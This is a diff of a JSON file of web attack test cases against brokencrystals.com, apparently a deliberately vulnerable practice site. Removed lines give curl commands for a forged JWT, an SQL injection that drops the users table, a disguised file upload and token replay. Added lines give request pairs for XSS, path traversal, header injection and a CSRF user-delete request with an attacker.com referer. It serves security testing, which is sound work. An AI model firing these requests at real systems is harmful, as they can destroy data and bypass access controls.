@@ -1,32 +1,128 @@
- [
+[
   {
-    "attack_vector": "jwt_authorization_bypass",
-    "test_scenario": "Send a malicious JWT token with altered claims to bypass authorization checks",
-    "full_payload_with_curl": "curl -X GET 'https://brokencrystals.com/api/protected-data?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik1vcGFjaXR5LWluc3BlYyIsImp0aSI6Ikluc2VjdGlvbiIsImtpdGVtIjoiaHR0cHM6Ly9hcHBsZWFwcGVjYXNzLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJhZGQxOSI7Cgkic3RhbnQtdG9rZW4iOmZhbHNlLCJzdWIiOiIxMjM0NTY3ODkwMCwiaWF0IjoxNjkwMjE5MzY1fQ.D_dA5CmNcLbXQ5_eBw1g-sW6lJz9RHKvTc8-bZ7aZi-3SjO5rUx_F2jVk0aMnFk_1d3KzQjA"
+    "testScenario": "Test for XSS vulnerability in URL parameters",
+    "baselineRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/?id=123",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {
+        "id": "123"
+      },
+      "body": null
+    },
+    "payloadRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/?id=<XSS_Payload>",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {},
+      "body": null
+    }
   },
   {
-    "attack_vector": "sql_injection_api_param",
-    "test_scenario": "Send a malicious SQL injection payload as an API parameter to manipulate database data",
-    "full_payload_with_curl": "curl -X POST 'https://brokencrystals.com/api/data?query=1;--%20drop%20table%20users%20--' -H 'Content-Type: application/json' -d '{}'"
+    "testScenario": "Test for directory traversal and file inclusion vulnerability in URLs",
+    "baselineRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {},
+      "body": null
+    },
+    "payloadRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/../assets/index-CHOz83TQ.js",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {},
+      "body": null
+    }
   },
   {
-    "attack_vector": "csrf",
-    "test_scenario": "Perform a CSRF attack by injecting malicious HTML code to trick the user into executing unauthorized API requests",
-    "full_payload_with_curl": "Not applicable - CSRF attacks involve manipulating client-side code, not curl commands"
+    "testScenario": "Test for header injection vulnerability",
+    "baselineRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {},
+      "body": null
+    },
+    "payloadRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "X-Custom-Header": "<XSS_Payload>"
+      },
+      "params": {},
+      "body": null
+    }
   },
   {
-    "attack_vector": "api_versioning_enumeration",
-    "test_scenario": "Identify and probe API version numbers to discover potential vulnerabilities in older versions",
-    "full_payload_with_curl": "curl -X GET 'https://brokencrystals.com/api/v1/endpoint' -H 'Accept: application/json'"
-  },
-  {
-    "attack_vector": "file_upload_invalid_extension",
-    "test_scenario": "Attempt to upload a file with an invalid extension to bypass input validation checks",
-    "full_payload_with_curl": "curl -X POST 'https://brokencrystals.com/api/upload?filename=maliciousFile' --data-binary '@evil.jpg.txt'"
-  },
-  {
-    "attack_vector": "token_replay",
-    "test_scenario": "Reuse a valid authentication token from previous requests to access protected resources without authorization",
-    "full_payload_with_curl": "curl -X GET 'https://brokencrystals.com/api/protected-data?token=<VALID_TOKEN_HERE>"
+    "testScenario": "Test for CSRF vulnerability",
+    "baselineRequest": {
+      "method": "GET",
+      "url": "https://brokencrystals.com/login",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {},
+      "cookies": {
+        "csrf_token": "abcdefg"
+      },
+      "body": null
+    },
+    "payloadRequest": {
+      "method": "POST",
+      "url": "https://brokencrystals.com/api/user/delete",
+      "headers": {
+        "upgrade-insecure-requests": "1",
+        "user-agent": "<Vulnerable_Browser>",
+        "referer": "https://attacker.com/malicious_page",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+      },
+      "params": {},
+      "cookies": {
+        "csrf_token": "abcdefg"
+      },
+      "body": null
+    }
   }
 ]
